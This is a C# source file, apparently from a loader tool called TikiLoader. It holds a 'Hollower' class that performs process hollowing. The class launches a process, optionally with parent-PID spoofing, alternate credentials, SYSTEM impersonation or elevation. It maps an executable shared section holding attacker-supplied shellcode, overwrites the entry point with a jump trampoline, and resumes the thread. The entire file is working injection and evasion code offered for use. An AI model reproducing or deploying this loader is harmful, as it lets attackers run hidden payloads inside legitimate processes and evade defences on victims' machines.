using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using static TikiLoader.Imports;
using static TikiLoader.Structs;
using static TikiLoader.Enums;
using static TikiLoader.Generic;

namespace TikiLoader
{
    public class Hollower
    {
        private const int AttributeSize = 24;
        private const ulong PatchSize = 0x10;

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        private uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();
            GetSystemInfo(ref info);
            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        private IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemoryProtection protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        private bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        private void SetLocalSection(uint size)
        {
            var vals = MapSection(GetCurrent(), MemoryProtection.ReadWrite, IntPtr.Zero);

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        private void CopyShellcode(byte[] buf)
        {
            var lsize = size_;

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        private IntPtr FindEntry(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {
            var tmp = MapSection(pInfo.hProcess, MemoryProtection.ExecuteRead, IntPtr.Zero);

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = BuildEntryPatch(tmp.Key);

            try
            {
                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();

            ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
            var res = ResumeThread(pInfo.hThread);
        }

        private IntPtr GetBuffer()
        {
            return localmap_;
        }

        ~Hollower()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);
        }

        public void Hollow(string binary, byte[] shellcode, int ppid)
        {
            var pinf = StartProcess(binary, ppid);

            FindEntry(pinf.hProcess);
            CreateSection((uint)shellcode.Length);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public void HollowWithoutPid(string binary, byte[] shellcode)
        {
            var pinf = StartProcessWOPid(binary);

            FindEntry(pinf.hProcess);
            CreateSection((uint)shellcode.Length);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public void HollowAs(string binary, byte[] shellcode, string domain, string username, string password)
        {
            var pinf = StartProcessAs(binary, domain, username, password);

            FindEntry(pinf.hProcess);
            CreateSection((uint)shellcode.Length);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public void HollowAsSystem(string binary, byte[] shellcode, int impersonationPid)
        {
            var pinf = StartProcessAsSystem(binary, impersonationPid);

            FindEntry(pinf.hProcess);
            CreateSection((uint)shellcode.Length);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public void HollowElevated(string binary, byte[] shellcode, int elevatedPid)
        {
            var pinf = StartElevatedProcess(binary, elevatedPid);

            FindEntry(pinf.hProcess);
            CreateSection((uint)shellcode.Length);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public Hollower()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }
    }
}